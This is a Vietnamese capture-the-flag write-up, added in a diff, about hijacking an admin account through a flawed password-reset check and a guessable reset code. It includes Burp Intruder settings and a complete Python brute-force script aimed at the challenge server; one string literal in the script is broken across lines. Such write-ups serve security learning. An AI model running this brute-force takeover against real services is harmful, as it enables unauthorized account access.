@@ -536,6 +536,329 @@ Mình quay sang tab Webhook.site kiểm tra và thấy một request gửi tới
 - Luôn luôn set HttpOnly=True cho các cookie quan trọng (Session ID, Token).
 
 
+# Write-up : Hoshino Portol
+
+# 1. Mục tiêu 
+- Mô tả đề bài: Chúng ta được cung cấp mã nguồn (Source code) của một website có chức năng **Đăng ký**, **Đăng nhập** và **Quên mật khẩu**. Trong Database có sẵn tài khoản *admin* giữ **Flag** nhưng ta không biết mật khẩu.
+
+- Mục tiêu cần đạt: Tìm cách đăng nhập được vào tài khoản admin để truy cập trang `/admin/flag` và lấy cờ (Flag).
+
+
+# 2. Giải thích luồng hoạt động 
+
+Trước tiên mình sẽ giải thích sơ qua về code và luồng hoạt động của chúng 
+
+File `auth.js` chịu trách nhiệm **Đăng ký** , **Đăng nhập** , và **Đăng xuất**.
+
+***Chức năng Đăng ký***
+
+```python
+router.post('/register', async (req, res) => {
+    const { username, password, email } = req.body;
+```
+`router.post('/register', ...)` : Định nghĩa đường dẫn đăng ký . Dùng phương thức POST 
+
+`const { ... } = req.body` : Lấy thông tin người dùng gửi lên từ form đăng ký ( gồm tên , mật khẩu , email ).
+
+```python
+try {
+        const hashedPassword = await bcrypt.hash(password, 10);
+``` 
+`bcrypt.hash(password, 10)` : Đây là bước quan trọng nhất 
+
+- Nó lấy mật khẩu người dùng nhập 
+- Nó băm nát mật khẩu đó ra 10 lần 
+- Kết quả `hashedPassword` sẽ là một chuỗi vô nghĩa . Điều này giúp bảo mật , kể cả Admin hay Hacker vào được Database cũng biết mật khẩu thật
+
+```python
+db.query(
+            'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
+            [username, hashedPassword, email, 'user'],
+            (error, results) => {
+```
+`db.query(...)`: Gửi lệnh vào Database MySQL.
+
+`INSERT INTO users ...` : Lệnh thêm người dùng mới vào bảng `users`
+
+`VALUES (?, ?, ?, ?)` : Các dấu `?` sẽ được thay thế bằng dữ liệu thật ở dòng dưới. Việc này giúp chống lại lỗi SQL Injection cơ bản 
+
+`'user'` : Mặc định ai đăng ký cũng chỉ là user thường, không được làm `admin`.
+
+***Chức năng đăng nhập***
+
+```python
+router.post('/login', (req, res) => {
+    const { username, password } = req.body;
+```
+Nhập tên và mật khẩu người dùng gửi lên để đăng nhập
+
+```python
+db.query(
+        'SELECT * FROM users WHERE username = ?',
+        [username],
+        async (error, results) => {
+```
+`SELECT * FROM users ...` : Tìm trong db xem có ai tên giống `username` người dùng nhập không
+
+```python
+const user = results[0];
+            const match = await bcrypt.compare(password, user.password);
+
+            if (!match) {
+                return res.status(401).json({ error: 'Invalid credentials' });
+            }
+```
+`bcrypt.compare(...)`: So sánh mật khẩu.
+
+```python
+req.session.user = {
+                id: user.id,
+                username: user.username,
+                email: user.email,
+                role: user.role
+            };
+
+            res.json({ success: true, message: 'Login successful!', role: user.role });
+```
+
+`req.session.user = ...` : Server lưu thông tin của người này vào bộ nhớ phiên làm việc (Session). Từ giờ trở đi, mỗi khi gửi request, Server sẽ kiểm tra req.session để biết là ai, có phải Admin không.
+
+File `resetPassword.js` : File này nhận yêu cầu từ người dùng (HTTP Request).
+
+```python
+router.post('/resetpassword', (req, res) => {
+    const { username, email, passwordnew, code_reset } = req.body;
+
+    if (!username || !email) {
+        return res.status(400).json({ error: 'Username and email are required' });
+    }
+```
+Hàm này xử lý yêu cầu gửi đến đường dẫn `/resetpassword`.
+
+Nó lấy 4 thông tin từ người dùng: **Tên**, **Email**, **Mật khẩu mới**, và **Mã reset** (nếu có).
+
+**Lỗ hổng logic đầu tiên : Kiểm tra tài khoản** 
+
+```python
+const validateQuery = 'SELECT 1 FROM users WHERE username = ? UNION SELECT 2 FROM users WHERE email = ?';
+    
+    db.query(validateQuery, [username, email], (error, results) => {
+        // ... (xử lý lỗi database) ...
+
+        if (results.length !== 2) {
+            return res.status(400).json({ error: 'Invalid username or email' });
+        }
+```
+`UNION` : CÂU LỆNH SQL GHÉP KẾT QUẢ 
+
+ - Vế 1: Tìm xem `username` có tồn tại không?
+ - Vế 2: Tìm xem `email` có tồn tại không?
+
+Nó không kiểm tra mối liên hệ. Bạn có thể nhập username của Admin nhưng email của Hacker. Cả 2 đều tồn tại trong hệ thống (ở 2 tài khoản khác nhau), nên kết quả vẫn là 2 dòng -> Hệ thống bị lừa và cho qua!
+
+```python
+if (!code_reset || code_reset === '') {
+            let newResetCode;
+            // KIỂM TRA EMAIL ĐỂ CHỌN ĐỘ KHÓ CỦA MÃ
+            if (email.toLowerCase().includes('admin')) {
+                newResetCode = uuidv4(); // Mã khó (nếu email chứa chữ 'admin')
+            } else {
+                // LỖ HỔNG SỐ 2: TẠO MÃ YẾU
+                const randomLetter = String.fromCharCode(65 + Math.floor(Math.random() * 6));
+                const randomNumbers = Math.floor(10 + Math.random() * 90);
+                newResetCode = randomLetter + randomNumbers + randomLetter;
+            }            
+            
+            // Lưu mã vào Database
+            updateCodeReset(username, email, newResetCode, (error, resetCode) => {
+                // ... Trả về thông báo thành công ...
+            });
+```
+Đoạn code này sẽ tạo mã reset , lúc này `code_reset` để trống 
+
+Vì bạn nhập email là `test1@gmail.com` (không chứa chữ "admin"), code nhảy vào nhánh else.
+
+Công thức tạo mã yếu:
+ - `randomLetter`: Chọn 1 chữ cái từ A-F (65 + random*6).
+ - `randomNumbers`: Chọn số từ 10-99.
+
+`updateCodeReset`: Lưu cái mã yếu xìu này vào Database, gắn với username là admin (do lỗ hổng số 1 ở trên đã cho qua user admin).
+
+---
+# 3. Phân tích và khai thác
+
+Ban đầu, khi nhìn vào source code, đặc biệt là file auth.js, mình thấy quy trình đăng nhập rất chặt chẽ:
+
+- Mật khẩu được mã hóa bằng bcrypt (một thuật toán băm rất mạnh, không thể dịch ngược).
+ - Câu lệnh SQL sử dụng `?` nên không thể sử dụng kỹ thuật **SQL Injection** cơ bản (như `' OR 1=1 --`) để vượt qua bước đăng nhập.
+
+**Kết luận**: Tấn công trực tiếp vào trang Login là bất khả thi. Cần chuyển hướng sang các tính năng khác.
+
+***Phát hiện Lỗ hổng Logic***
+
+Khi đọc **file** `resetPassword.js`, ta phát hiện ra 2 vấn đề nghiêm trọng nằm cạnh nhau:
+
+- Hệ thống sử dụng câu lệnh UNION để kiểm tra thông tin trước khi reset mật khẩu:
+  
+  - UNION là lệnh SQL dùng để gộp kết quả của 2 câu lệnh SELECT lại với nhau.
+  - Code chỉ đếm số dòng trả về (length === 2). Nó kiểm tra xem "User có tồn tại không?" VÀ "Email có tồn tại không?" một cách tách biệt. Nó QUÊN kiểm tra xem Email đó có thực sự thuộc về User đó hay không.
+- Sinh mã xác thực yếu
+
+  - Ngay sau khi vượt qua bước kiểm tra trên, code có đoạn tạo mã xác thực (OTP)
+  - Vấn đề: Nếu email nhập vào KHÔNG chứa chữ **"admin"**, hệ thống sẽ tạo ra một mã rất ngắn và dễ đoán, thay vì dùng mã chuẩn `uuidv4`.
+
+Đến đây , mình sẽ nói sơ lược quy trình tấn công như sau : 
+
+Để vượt qua câu lệnh `UNION`, ta cần một **email** tồn tại trong hệ thống nhưng không được chứa chữ **admin** (để kích hoạt lỗ hổng sinh mã yếu).
+
+Thực hiện: Truy cập `/register` **đăng ký** tài khoản mới.
+
+ - User: `test10`
+ - Email: `test10@gmail.com`
+
+Tiếp theo , đánh lừa hệ thống như sau :
+ 
+ - Truy cập chức năng **Reset Password**
+ - Nhập `username` : `admin`
+ - Nhập `email` vừa mới tạo : `test10@gmail.com`
+ - Ô `Reset Code` : để trống -> để nó còn gửi mã về 
+ - Nhập `New Password` : `12345678`
+
+**Kết quả** : 
+ 
+- `SELECT... username='admin'` -> Tìm thấy (1 dòng).
+- `SELECT... email='test10@gmail.com'` -> Tìm thấy (1 dòng).
+- Tổng = 2 dòng -> Hệ thống cho phép đi tiếp.
+- Email `test10@gmail.com` không chứa chữ **"admin"** -> Hệ thống tạo mã yếu và lưu vào Database cho user admin.
+
+Cuối cùng , dò Reset Code bằng burpsuite 😅
+
+Sau khi có passcode gửi đi thì mình nhập một giá trị bất kì : A10A vào ô Reset Code , rồi dùng burpsuite bắt request đó lại 
+ 
+ - Tiếp tục lấy request vừa bắt được `Add to Instruder` 
+ - Trong thẻ Positions của Intruder:
+  
+   - Attack type: Chọn Cluster bomb.
+   - Bôi đen cho 3 vị trí riêng biệt , vị trí đầu là chữ A , vị trí thứ 2 là số 10 , vị trí thứ 3 là chữ A , rồi lần lượt ấn nút **add** cho từng vị trí 
+   - Chuyển sang thẻ **Payload** 
+   - Payload set: 1 -> Type: Simple list -> Nhập thủ công các chữ cái từ A đến F (A, B, C, D, E, F).
+   - Payload set: 2 (Vị trí số ở giữa) -> Type: Numbers -> `From: 10` `To: 99` `Step: 1`
+   - Payload set: 3 (Vị trí chữ cái cuối) -> Giống hệt cái đầu 
+- Và rồi start attack 
+
+Tuy nhiên cách này khá may rủi , bởi vì passcode chỉ có hiệu lực trong vòng 5 phút mà tổng số request có thể sẽ phải gửi là 6 x 90 x 6 = 3240 requests , cho nên nếu hên , chữ cái đầu tiên mà bắt đầu bằng chữ **A** thì may ra đổi được password mới , và mình đã phải thử đi thử lại nhiều lần liên tục sau mỗi 5 phút 🙂 
+
+Cách 2 : Bạn nhờ ***GEMINI*** viết đoạn code Python , là cách chuẩn chỉ nhất
+
+Đây là đoạn code của nó 
+```python
+import requests
+import itertools
+import string
+import sys
+
+# CẤU HÌNH
+URL = "http://14.225.220.66:5018"  # Điền đúng địa chỉ IP:PORT của bài
+MY_EMAIL = "test10@gmail.com"       # Email bạn đã đăng ký và dùng để lừa server
+TARGET_USER = "admin"
+NEW_PASSWORD = "12345678
+"
+
+# Session dùng để giữ kết nối (Cookie)
+s = requests.Session()
+
+def trigger_reset_code():
+    """Bước 1: Gửi yêu cầu để server tạo mã yếu"""
+    print(f"[*] Đang gửi yêu cầu reset password cho {TARGET_USER} với email {MY_EMAIL}...")
+    url = f"{URL}/resetpassword"
+    data = {
+        "username": TARGET_USER,
+        "email": MY_EMAIL,
+        "code_reset": ""  # Để rỗng để tạo mã mới
+    }
+    
+    try:
+        r = s.post(url, json=data)
+        if "Reset code generated" in r.text:
+            print("[+] Thành công! Server đã tạo mã yếu và lưu vào DB.")
+            return True
+        else:
+            print(f"[-] Thất bại: {r.text}")
+            return False
+    except Exception as e:
+        print(f"[-] Lỗi kết nối: {e}")
+        return False
+
+def brute_force():
+    """Bước 2: Dò mã reset (A10A -> F99F)"""
+    print("[*] Bắt đầu Brute-force mã reset...")
+    
+    # Tạo danh sách ký tự cần dò
+    chars = ['A', 'B', 'C', 'D', 'E', 'F']  # Math.random() * 6
+    numbers = range(10, 100)                # 10 -> 99
+    
+    # Tổng số trường hợp: 6 * 90 * 6 = 3240
+    total = len(chars) * len(numbers) * len(chars)
+    count = 0
+    
+    url = f"{URL}/resetpassword"
+    
+    # Vòng lặp dò mã: Chữ đầu -> Số giữa -> Chữ cuối
+    for c1 in chars:
+        for n in numbers:
+            for c2 in chars:
+                code = f"{c1}{n}{c2}" # Ví dụ: A10A
+                count += 1
+                
+                # In tiến trình mỗi 500 lần thử cho đỡ rối mắt
+                if count % 500 == 0:
+                    print(f"    Đang thử: {code} ({count}/{total})")
+                
+                data = {
+                    "username": TARGET_USER,
+                    "email": MY_EMAIL,
+                    "passwordnew": NEW_PASSWORD,
+                    "code_reset": code
+                }
+                
+                try:
+                    r = s.post(url, json=data)
+                    
+                    # Nếu server trả về success (hoặc password reset successful)
+                    if "success" in r.text and "true" in r.text:
+                        print(f"\n[!!!] BINGO! Tìm thấy mã đúng: {code}")
+                        print(f"[+] Mật khẩu admin đã đổi thành: {NEW_PASSWORD}")
+                        print("[+] Hãy vào đăng nhập ngay!")
+                        return True
+                        
+                except Exception as e:
+                    pass
+
+    print("\n[-] Đã thử hết mã mà không thành công. Có thể mã đã hết hạn.")
+    return False
+
+if __name__ == "__main__":
+    if trigger_reset_code():
+        brute_force()
+```
+
+Khi đã hoàn thành , thì nó tự động thoát , nó tự làm cả bước xin mã và nhập mã rồi cho nên sau khi thoát thì mất khẩu admin đã được đổi thành 12345678 
+
+Bây giờ login lại vào `username` : `admin` và `password` : `12345678` và lấy flag thôi 
+
+`flag : KCSC{G0tt4_h4ck_'3m_4ll!}`
+
+---
+# 3. Bài học rút ra 
+
+- Đừng chỉ tìm lỗi cú pháp (Syntax Error): thấy code dùng Prepared Statement (?) là bỏ qua, nghĩ rằng không Hack được SQL Injection.
+- Đọc kỹ Source Code (Whitebox): Những lỗi logic như UNION hay công thức Math.random * 6 rất khó phát hiện nếu chỉ scan từ bên ngoài (Blackbox), nhưng lại hiện nguyên hình khi chịu khó đọc code.
+
+
+
+
+
+
 
 
 
